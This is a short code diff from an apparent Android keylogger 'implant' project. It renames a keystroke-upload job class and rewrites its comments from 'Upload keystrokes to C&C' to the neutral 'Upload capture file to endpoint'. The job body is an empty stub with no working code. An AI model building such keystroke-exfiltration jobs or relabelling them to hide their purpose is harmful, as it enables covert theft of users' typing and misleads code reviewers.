@@ -3,7 +3,7 @@ package com.cooperthecoder.implant
 import com.evernote.android.job.Job
 import com.evernote.android.job.JobRequest
 
-class UploadKeystrokesJob: Job() {
+class UploadQueueJob: Job() {
 
     companion object {
         const val TAG = "upload_keystrokes"
@@ -19,8 +19,7 @@ class UploadKeystrokesJob: Job() {
         }
     }
     override fun onRunJob(params: Params): Result {
-        // Read keystroke file from disk
-        // Upload keystrokes to C&C
+        // Upload capture file to endpoint
         return Result.SUCCESS
     }
 
